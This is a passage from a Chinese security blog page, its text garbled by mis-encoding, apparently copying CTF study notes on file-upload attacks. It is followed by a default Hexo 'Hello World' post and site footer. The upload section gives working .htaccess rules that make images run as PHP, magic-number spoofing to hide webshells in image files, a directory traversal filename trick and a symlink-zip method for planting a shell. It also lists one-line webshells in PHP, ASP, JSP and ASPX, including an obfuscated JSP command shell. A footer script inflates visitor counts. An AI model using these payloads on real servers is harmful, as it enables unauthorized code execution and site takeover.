<p>å¯ç”¨.htaccessï¼Œéœ€è¦ä¿®æ”¹httpd.confï¼Œå¯ç”¨AllowOverrideï¼Œå¹¶å¯ä»¥ç”¨AllowOverrideé™åˆ¶ç‰¹å®šå‘½ä»¤çš„ä½¿ç”¨ã€‚å¦‚æœéœ€è¦ä½¿ç”¨.htaccessä»¥å¤–çš„å…¶ä»–æ–‡ä»¶åï¼Œå¯ä»¥ç”¨AccessFileNameæŒ‡ä»¤æ¥æ”¹å˜ã€‚ä¾‹å¦‚ï¼Œéœ€è¦ä½¿ç”¨.config ï¼Œåˆ™å¯ä»¥åœ¨æœåŠ¡å™¨é…ç½®æ–‡ä»¶ä¸­æŒ‰ä»¥ä¸‹æ–¹æ³•é…ç½®ï¼šAccessFileName .config ã€‚</p>
<p>ç¬¼ç»Ÿåœ°è¯´ï¼Œ.htaccesså¯ä»¥å¸®æˆ‘ä»¬å®ç°åŒ…æ‹¬ï¼šæ–‡ä»¶å¤¹å¯†ç ä¿æŠ¤ã€ç”¨æˆ·è‡ªåŠ¨é‡å®šå‘ã€è‡ªå®šä¹‰é”™è¯¯é¡µé¢ã€æ”¹å˜ä½ çš„æ–‡ä»¶æ‰©å±•åã€å°ç¦ç‰¹å®šIPåœ°å€çš„ç”¨æˆ·ã€åªå…è®¸ç‰¹å®šIPåœ°å€çš„ç”¨æˆ·ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ï¼Œä»¥åŠä½¿ç”¨å…¶ä»–æ–‡ä»¶ä½œä¸ºindexæ–‡ä»¶ç­‰ä¸€äº›åŠŸèƒ½ã€‚</p>
</blockquote>
<p>ä¸€èˆ¬<code>.htaccess</code>å¯ä»¥ç”¨æ¥ç•™åé—¨å’Œé’ˆå¯¹é»‘åå•ç»•è¿‡ã€‚åœ¨ä¸Šä¼ ç½‘ç«™çš„æ ¹ç›®å½•ä¸‹ï¼Œä¸Šä¼ ä¸€ä¸ª<code>.htaccess</code>æ–‡ä»¶å³å¯ã€‚</p>
<p>ç»•è¿‡æ–¹æ³•ï¼š</p>
<blockquote>
<ul>
<li>é’ˆå¯¹é»‘åå•ç»•è¿‡</li>
</ul>
<p>åˆ›å»ºä¸€ä¸ªtxtæ–‡ä»¶ï¼Œå†™å…¥</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType  application/x-httpd-php    .png</span><br></pre></td></tr></table></figure>



<p>å¦å­˜ä¸º <code>.htaccess</code> åç§°ï¼Œä¿å­˜ç±»å‹ä¸ºæ‰€æœ‰æ–‡ä»¶ï¼Œå³å¯å°†<code>png</code>æ–‡ä»¶è§£æä¸º<code>php</code>æ–‡ä»¶ã€‚</p>
<ul>
<li>ç•™åé—¨</li>
</ul>
<p>åœ¨<code>.htaccess</code> å†…å†™å…¥<code>php</code>è§£æè§„åˆ™ï¼Œç±»ä¼¼äºæŠŠæ–‡ä»¶ååŒ…å«<code>s</code>çš„è§£ææˆ<code>php</code>æ–‡ä»¶</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;s&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>



<p><code>shell.png</code> å°±ä¼šä»¥<code>php</code>æ–‡ä»¶æ‰§è¡Œ</p>
<ul>
<li>åˆ©ç”¨.htaccessè¿›è¡Œæ–‡ä»¶åŒ…å«</li>
</ul>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_file &quot;.htaccess&quot;</span><br><span class="line">#&lt;?php eval($_POST[cmd]);?&gt;</span><br></pre></td></tr></table></figure>



<ul>
<li>ä½¿ç”¨#æ³¨é‡Šä½¿å¾—.htaccessèƒ½å¤ŸæˆåŠŸè§£æ</li>
</ul>
</blockquote>
<h3 id="æœåŠ¡å™¨æ£€æµ‹ï¼ˆæ–‡ä»¶å†…å®¹æ£€æµ‹ï¼‰"><a href="#æœåŠ¡å™¨æ£€æµ‹ï¼ˆæ–‡ä»¶å†…å®¹æ£€æµ‹ï¼‰" class="headerlink" title="æœåŠ¡å™¨æ£€æµ‹ï¼ˆæ–‡ä»¶å†…å®¹æ£€æµ‹ï¼‰ #"></a>æœåŠ¡å™¨æ£€æµ‹ï¼ˆæ–‡ä»¶å†…å®¹æ£€æµ‹ï¼‰ <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A3%80%E6%B5%8B-%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B">#</a></h3><h4 id="æ–‡ä»¶å¹»æ•°æ£€æµ‹ï¼ˆæ–‡ä»¶å¼€å¤´ï¼‰"><a href="#æ–‡ä»¶å¹»æ•°æ£€æµ‹ï¼ˆæ–‡ä»¶å¼€å¤´ï¼‰" class="headerlink" title="æ–‡ä»¶å¹»æ•°æ£€æµ‹ï¼ˆæ–‡ä»¶å¼€å¤´ï¼‰ #"></a>æ–‡ä»¶å¹»æ•°æ£€æµ‹ï¼ˆæ–‡ä»¶å¼€å¤´ï¼‰ <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%96%87%E4%BB%B6%E5%B9%BB%E6%95%B0%E6%A3%80%E6%B5%8B-%E6%96%87%E4%BB%B6%E5%BC%80%E5%A4%B4">#</a></h4><blockquote>
<p>å¹»æ•° magic numberï¼Œå®ƒå¯ä»¥ç”¨æ¥æ ‡è®°æ–‡ä»¶æˆ–è€…åè®®çš„æ ¼å¼ï¼Œå¾ˆå¤šæ–‡ä»¶éƒ½æœ‰å¹»æ•°æ ‡å¿—æ¥è¡¨æ˜è¯¥æ–‡ä»¶çš„æ ¼å¼ã€‚</p>
</blockquote>
<p>è¦ç»•è¿‡æ–‡ä»¶å¹»æ•°æ£€æµ‹å°±è¦åœ¨æ–‡ä»¶å¼€å¤´å†™ä¸Šå¦‚ä¸‹çš„å€¼</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.jpg	FF D8 FF E0 00 10 4A 46 49 46</span><br><span class="line">.gif	47 49 46 38 39 61</span><br><span class="line">.png	89 50 4E 47</span><br></pre></td></tr></table></figure>



<p>åœ¨æ–‡ä»¶å¹»æ•°åé¢åŠ ä¸Šè‡ªå·±çš„WebShellä»£ç å°±è¡Œ</p>
<h4 id="æ–‡ä»¶ç›¸å…³ä¿¡æ¯æ£€æµ‹"><a href="#æ–‡ä»¶ç›¸å…³ä¿¡æ¯æ£€æµ‹" class="headerlink" title="æ–‡ä»¶ç›¸å…³ä¿¡æ¯æ£€æµ‹ #"></a>æ–‡ä»¶ç›¸å…³ä¿¡æ¯æ£€æµ‹ <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%96%87%E4%BB%B6%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%E6%A3%80%E6%B5%8B">#</a></h4><p>å›¾åƒæ–‡ä»¶ç›¸å…³ä¿¡æ¯æ£€æµ‹å¸¸ç”¨çš„æ˜¯getimagesize()å‡½æ•°ï¼Œéœ€è¦æŠŠæ–‡ä»¶å¤´éƒ¨åˆ†ä¼ªé€ ï¼Œä¹Ÿå°±æ˜¯åœ¨å¹»æ•°çš„åŸºç¡€ä¸Šè¿˜åŠ äº†ä¸€äº›æ–‡ä»¶ä¿¡æ¯ã€‚</p>
<blockquote>
<ul>
<li>ä¾‹å¦‚ä¸‹é¢ç»“æ„</li>
</ul>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">(...some binary data for image...)</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line">(... skipping the rest of binary data ...)</span><br></pre></td></tr></table></figure>


</blockquote>
<p>å¦ä¸€ç§æ˜¯åˆ¤æ–­æ˜¯å¦åŒ…å«<code>&lt;?</code>æˆ–è€…<code>php</code></p>
<blockquote>
<ul>
<li><p>ç»•è¿‡<code>&lt;?</code>ï¼š</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&#x27;php&#x27;&gt;@eval($_POST[cmd]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>


</li>
<li><p>ç»•è¿‡<code>php</code>ï¼š</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= @eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</blockquote>
<p>ç»•è¿‡æ–¹æ³•ï¼š</p>
<blockquote>
<ul>
<li>å¯¹æ¸²æŸ“&#x2F;åŠ è½½æµ‹è¯•çš„æ”»å‡»æ–¹å¼æ˜¯ä»£ç æ³¨å…¥ç»•è¿‡ã€‚ä½¿ç”¨winhexåœ¨ä¸ç ´åæ–‡ä»¶æœ¬èº«çš„æ¸²æŸ“æƒ…å†µä¸‹æ‰¾ä¸€ä¸ªç©ºç™½åŒºè¿›è¡Œå¡«å……ä»£ç ï¼Œä¸€èˆ¬ä¸ºå›¾ç‰‡çš„æ³¨é‡ŠåŒºã€‚</li>
<li>å¯¹äºŒæ¬¡æ¸²æŸ“çš„æ”»å‡»æ–¹å¼å°±æ˜¯æ”»å‡»æ–‡ä»¶åŠ è½½å™¨è‡ªèº«ã€‚ä¾‹å¦‚ï¼š</li>
</ul>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ä¸Šä¼ æ–‡ä»¶æ•°æ®ä¸å®Œæ•´çš„gifæ–‡ä»¶ -&gt; è§¦å‘æŠ¥é”™imagecreatefromgif()å‡½æ•°</span><br><span class="line">ä¸Šä¼ æ–‡ä»¶æ•°æ®ä¸å®Œæ•´çš„pngæ–‡ä»¶ -&gt; è§¦å‘æŠ¥é”™imagecreatefrompng()å‡½æ•°</span><br></pre></td></tr></table></figure>



<p>æŸåå°è°ƒç”¨GDåº“å¯¹å›¾åƒè¿›è¡ŒäºŒæ¬¡æ¸²æŸ“çš„ä»£ç </p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function image_gd_open($file, $extension)</span><br><span class="line">&#123;</span><br><span class="line">$extension = str_replace(&#x27;jpg&#x27;, &#x27;jpeg&#x27;, $extension);</span><br><span class="line">$open_func = &#x27;imageCreateFrom&#x27;. $extension; //å‡½æ•°åå˜æˆimageCreateFrompng ä¹‹ç±»</span><br><span class="line">if (!function_exists($open_func))</span><br><span class="line">&#123;</span><br><span class="line">	return FALSE;</span><br><span class="line">&#125;</span><br><span class="line">return $open_func($file); //å˜æˆimagecreatefrompng(&#x27;/tmp/phpimage&#x27;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>å¯¹æ–‡ä»¶åŠ è½½å™¨è¿›è¡Œæ”»å‡»ï¼Œå¸¸è§çš„å°±æ˜¯æº¢å‡ºæ”»å‡»ã€‚ä¸Šä¼ è‡ªå·±çš„æ¶æ„æ–‡ä»¶åï¼ŒæœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶åŠ è½½å™¨ä¼šä¸»åŠ¨è¿›è¡ŒåŠ è½½æµ‹è¯•ï¼ŒåŠ è½½æµ‹è¯•æ—¶è¢«æº¢å‡ºæ”»å‡»æ‰§è¡Œshellcodeï¼Œæ¯”å¦‚access&#x2F;mdbæº¢å‡ºã€‚</li>
</ul>
</blockquote>
<h3 id="æ–‡ä»¶ä¸Šä¼ ä¸­çš„ç›®å½•ç©¿è¶Šæ¼æ´"><a href="#æ–‡ä»¶ä¸Šä¼ ä¸­çš„ç›®å½•ç©¿è¶Šæ¼æ´" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ ä¸­çš„ç›®å½•ç©¿è¶Šæ¼æ´ #"></a>æ–‡ä»¶ä¸Šä¼ ä¸­çš„ç›®å½•ç©¿è¶Šæ¼æ´ <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%AD%E7%9A%84%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E">#</a></h3><p>æ”»å‡»æ–¹å¼</p>
<blockquote>
<p>å½¢å¼ï¼šä¸Šä¼ çš„æ–‡ä»¶ä¼šè¢«è§£æä¸ºæ—¥å¿—ä¸èƒ½æ‰§è¡Œï¼Œç»™å‡ºäº†<code>/uploads/xxx.php</code>è·¯å¾„å¹¶ä¸”å¯ä»¥æŸ¥è¯¢</p>
<p>ç»•è¿‡ï¼šä¸Šä¼ æ–‡ä»¶çš„æ—¶å€™æŠ“åŒ…ï¼Œä¿®æ”¹æ–‡ä»¶åï¼ˆfilenameï¼‰ä¸º<code>./../../../../flag</code>ï¼Œä¸Šä¼ æˆåŠŸåè·¯å¾„å˜ä¸º<code>/uploads/./../../../../flag</code>å³å¯è¿›è¡Œç›®å½•ç©¿è¶Š</p>
</blockquote>
<h2 id="æ”»å‡»ä»£ç "><a href="#æ”»å‡»ä»£ç " class="headerlink" title="æ”»å‡»ä»£ç  #"></a>æ”»å‡»ä»£ç  <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81">#</a></h2><h2 id="æ–‡ä»¶å‹ç¼©ï¼š"><a href="#æ–‡ä»¶å‹ç¼©ï¼š" class="headerlink" title="æ–‡ä»¶å‹ç¼©ï¼š"></a>æ–‡ä»¶å‹ç¼©ï¼š</h2><p>è½¯é“¾æ¥å‹ç¼©åŒ…ï¼Œç„¶åä¸Šä¼ åˆ°è½¯é“¾æ¥ä¸‹ï¼Œæ”¾ğŸè¿›è¡Œæ”»å‡»</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ln -s /var/www/html web  #åˆ›å»ºè½¯é“¾æ¥æ–‡ä»¶å¤¹</span><br><span class="line">zip -y zip.zip web   #å°†è½¯é“¾æ¥å‹ç¼©ç”Ÿæˆä¸€ä¸ªzip.zip</span><br><span class="line"></span><br><span class="line">å†åœ¨webä¸‹é¢æ”¾ä¸€ä¸ªshell.phpï¼ˆğŸï¼‰ </span><br><span class="line">zip -y z.zip web   #å†ç”Ÿæˆä¸€ä¸ªå¸¦ğŸçš„å‹ç¼©åŒ…</span><br><span class="line"></span><br><span class="line">ç„¶åä¸Šä¼ zip.zipï¼Œå°†ä¸Šä¼ è·¯å¾„æ”¹åˆ°å¯æ§ç›®å½•/var/www/html</span><br><span class="line">ç„¶åä¸Šä¼ z.zipï¼Œå³ä¼ åˆ°äº†ï¼Œæ˜¾ç¤ºçš„ç½‘é¡µä¸‹ï¼ˆvar/www/html/shell.phpï¼‰</span><br><span class="line">èšå‰‘</span><br></pre></td></tr></table></figure>



<h3 id="å¸¸ç”¨æ”»å‡»ä»£ç "><a href="#å¸¸ç”¨æ”»å‡»ä»£ç " class="headerlink" title="å¸¸ç”¨æ”»å‡»ä»£ç  #"></a>å¸¸ç”¨æ”»å‡»ä»£ç  <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E5%B8%B8%E7%94%A8%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81">#</a></h3><blockquote>
<p>ç®€å•çš„ä¸€å¥è¯æœ¨é©¬</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>



<p>ç»•è¿‡<code>&lt;?</code>é™åˆ¶çš„ä¸€å¥è¯æœ¨é©¬</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language = &#x27;php&#x27;&gt;@eval($_POST[cmd]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<p>ç»•è¿‡<code>&lt;?php ?&gt;</code>é™åˆ¶çš„ä¸€å¥è¯æœ¨é©¬</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= @eval($_POST[&#x27;cmd&#x27;]);</span><br></pre></td></tr></table></figure>



<p>aspä¸€å¥è¯æœ¨é©¬</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%eval(Request.Item[&quot;cmd&quot;],â€unsafeâ€);%&gt;</span><br></pre></td></tr></table></figure>



<p>JSPä¸€å¥è¯æœ¨é©¬</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%if(request.getParameter(&quot;f&quot;)!=null)(newjava.io.FileOutputStream (application.getRealPath(&quot;\\&quot;)+request.getParameter(&quot;f&quot;))).write (request.getParameter(&quot;t&quot;).getBytes());%&gt;</span><br></pre></td></tr></table></figure>

<p>JSPä¸€å¥è¯å…æ€ï¼ˆASCLLç¼–ç ï¼‰</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot;  language=&quot;java&quot; %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    if(request.getParameter(&quot;cmd&quot;)!=null)&#123;</span><br><span class="line">        Class rt = Class.forName(new String(new byte[] &#123; 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101 &#125;));</span><br><span class="line">        Process e = (Process) rt.getMethod(new String(new byte[] &#123; 101, 120, 101, 99 &#125;), String.class).invoke(rt.getMethod(new String(new byte[] &#123; 103, 101, 116, 82, 117, 110, 116, 105, 109, 101 &#125;)).invoke(null), request.getParameter(&quot;cmd&quot;) );</span><br><span class="line">        java.io.InputStream in = e.getInputStream();</span><br><span class="line">        int a = -1;byte[] b = new byte[2048];out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125;out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>ASPXä¸€å¥è¯</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;C#&quot;runat=&quot;server&quot;&gt;WebAdmin2Y.x.y a=new WebAdmin2Y.x.y(&quot;add6bb58e139be10&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>1</p>
</blockquote>
<h3 id="å…¶å®ƒæ”»å‡»ä»£ç "><a href="#å…¶å®ƒæ”»å‡»ä»£ç " class="headerlink" title="å…¶å®ƒæ”»å‡»ä»£ç  #"></a>å…¶å®ƒæ”»å‡»ä»£ç  <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E5%85%B6%E5%AE%83%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81">#</a></h3><blockquote>
<p>å¼‚æˆ–å–åç­‰æ“ä½œå†™shellçš„phpè„šæœ¬ã€æ··æ·†æœ¨é©¬ã€ä¸æ­»é©¬ã€‚</p>
</blockquote>
<h2 id="æ›´å¤šå‚è€ƒ"><a href="#æ›´å¤šå‚è€ƒ" class="headerlink" title="æ›´å¤šå‚è€ƒ #"></a>æ›´å¤šå‚è€ƒ <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%9B%B4%E5%A4%9A%E5%8F%82%E8%80%83">#</a></h2><p><a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-41672-1-1.html?from=sec">https://bbs.ichunqiu.com/thread-41672-1-1.html?from=sec</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/253698.html">https://www.freebuf.com/articles/web/253698.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/179954.html">https://www.freebuf.com/articles/web/179954.html</a></p>

      
    </div>

    
    
    
	
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://chensonghi.github.io./2023/10/08/hello-world/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ch.jpg">
      <meta itemprop="name" content="chleynx">
      <meta itemprop="description" content="Record my study life">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="chleynx's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/08/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2023-10-08 07:59:16" itemprop="dateCreated datePublished" datetime="2023-10-08T07:59:16+08:00">2023-10-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2023-10-10 18:45:09" itemprop="dateModified" datetime="2023-10-10T18:45:09+08:00">2023-10-10</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>

      
    </div>

    
    
    
	
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  



  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="ä¸Šä¸€é¡µ"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="chleynx"
      src="/images/ch.jpg">
  <p class="site-author-name" itemprop="name">chleynx</p>
  <div class="site-description" itemprop="description">Record my study life</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">19</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">åˆ†ç±»</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">æ ‡ç­¾</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/chensonghi/chensonghi.github.io/" title="GitHub â†’ https:&#x2F;&#x2F;github.com&#x2F;chensonghi&#x2F;chensonghi.github.io&#x2F;" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://blog.csdn.net/c582037" title="CSDN â†’ https:&#x2F;&#x2F;blog.csdn.net&#x2F;c582037" rel="noopener" target="_blank"><i class="codiepie fa-fw"></i>CSDN</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2023-10-8 â€“ 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">chleynx</span>
</div>
  <div class="powered-by">ç”± <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> å¼ºåŠ›é©±åŠ¨
  </div>


    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

    <span id="busuanzi_container_site_pv">æ€»è®¿é—®é‡<span id="busuanzi_value_site_pv"></span>æ¬¡</span>
    <span class="post-meta-divider">|</span>
    <span id="busuanzi_container_site_uv">æ€»è®¿å®¢æ•°<span id="busuanzi_value_site_uv"></span>äºº</span>
    <span class="post-meta-divider">|</span>
<!-- ä¸è’œå­è®¡æ•°åˆå§‹å€¼çº æ­£ -->
<script>
$(document).ready(function() {

    var int = setInterval(fixCount, 50);  // 50mså‘¨æœŸæ£€æµ‹å‡½æ•°
    var countOffset = 20000;  // åˆå§‹åŒ–é¦–æ¬¡æ•°æ®

    function fixCount() {            
       if (document.getElementById("busuanzi_container_site_pv").style.display != "none")
        {
            $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + countOffset); 
            clearInterval(int);
        }                  
        if ($("#busuanzi_container_site_pv").css("display") != "none")
        {
            $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + countOffset); // åŠ ä¸Šåˆå§‹æ•°æ® 
            clearInterval(int); // åœæ­¢æ£€æµ‹
        }  
    }
